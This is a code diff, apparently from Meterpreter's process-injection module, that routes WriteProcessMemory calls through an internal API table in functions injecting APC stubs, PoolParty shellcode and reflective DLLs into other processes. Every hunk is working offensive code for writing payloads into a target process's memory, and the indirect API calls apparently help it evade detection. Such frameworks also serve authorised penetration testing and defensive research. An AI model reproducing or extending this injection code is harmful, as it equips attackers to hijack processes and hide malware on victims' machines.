@@ -217,10 +217,10 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 				
 				memset( lpNopSled, 0x90, mbi.RegionSize );
 				
-				if( !WriteProcessMemory( hProcess, lpRemoteAddress, lpNopSled, mbi.RegionSize, NULL ) )
+				if( !met_api->winapi.kernel32.WriteProcessMemory( hProcess, lpRemoteAddress, lpNopSled, mbi.RegionSize, NULL ) )
 					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpNopSled failed" )
 				
-				if( !WriteProcessMemory( hProcess, ((BYTE*)lpRemoteAddress + mbi.RegionSize - sizeof(bStub)), bStub, sizeof(bStub), NULL ) )
+				if( !met_api->winapi.kernel32.WriteProcessMemory( hProcess, ((BYTE*)lpRemoteAddress + mbi.RegionSize - sizeof(bStub)), bStub, sizeof(bStub), NULL ) )
 					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory bStub failed" )
 
 				free( lpNopSled );
@@ -258,11 +258,11 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 		dprintf( "[INJECT] -- dwMeterpreterArch=%s, lpRemoteApcStub=0x%08X, lpRemoteApcContext=0x%08X", ( dwMeterpreterArch == 2 ? "x64" : "x86" ), lpRemoteApcStub, lpRemoteApcContext );
 
 		// Write the apc stub to memory...
-		if( !WriteProcessMemory( hProcess, lpRemoteApcStub, lpApcStub, dwApcStubLength, NULL ) )
+		if( !met_api->winapi.kernel32.WriteProcessMemory( hProcess, lpRemoteApcStub, lpApcStub, dwApcStubLength, NULL ) )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcStub failed" )
 
 		// Write the apc context to memory...
-		if( !WriteProcessMemory( hProcess, lpRemoteApcContext, (LPCVOID)&ctx, sizeof(APCCONTEXT), NULL ) )
+		if( !met_api->winapi.kernel32.WriteProcessMemory( hProcess, lpRemoteApcContext, (LPCVOID)&ctx, sizeof(APCCONTEXT), NULL ) )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcContext failed" )
 
 		do
@@ -554,11 +554,11 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] VirtualAllocEx failed!");
 		}
 		
-		if (!WriteProcessMemory(hProcess, lpPoolPartyStub, lpStub, dwStubSize, NULL)) {
+		if (!met_api->winapi.kernel32.WriteProcessMemory(hProcess, lpPoolPartyStub, lpStub, dwStubSize, NULL)) {
 			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write custom shellcode!");
 		}
 
-		if (!WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + dwStubSize, &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
+		if (!met_api->winapi.kernel32.WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + dwStubSize, &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
 			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write poolparty shellcode prologue!");
 		}
 
@@ -662,7 +662,7 @@ DWORD inject_dll(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD
 				if (!lpRemoteArg)
 					BREAK_ON_ERROR("[INJECT] inject_dll. VirtualAllocEx 1 failed");
 
-				if (!WriteProcessMemory(hProcess, lpRemoteArg, lpArg, stArgSize, NULL))
+				if (!met_api->winapi.kernel32.WriteProcessMemory(hProcess, lpRemoteArg, lpArg, stArgSize, NULL))
 					BREAK_ON_ERROR("[INJECT] inject_dll. WriteProcessMemory 1 failed");
 			}
 			else
@@ -678,7 +678,7 @@ DWORD inject_dll(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD
 			BREAK_ON_ERROR("[INJECT] inject_dll. VirtualAllocEx 2 failed");
 
 		// write the image into the host process...
-		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLength, NULL))
+		if (!met_api->winapi.kernel32.WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLength, NULL))
 			BREAK_ON_ERROR("[INJECT] inject_dll. WriteProcessMemory 2 failed");
 
 		// add the offset to ReflectiveLoader() to the remote library address...
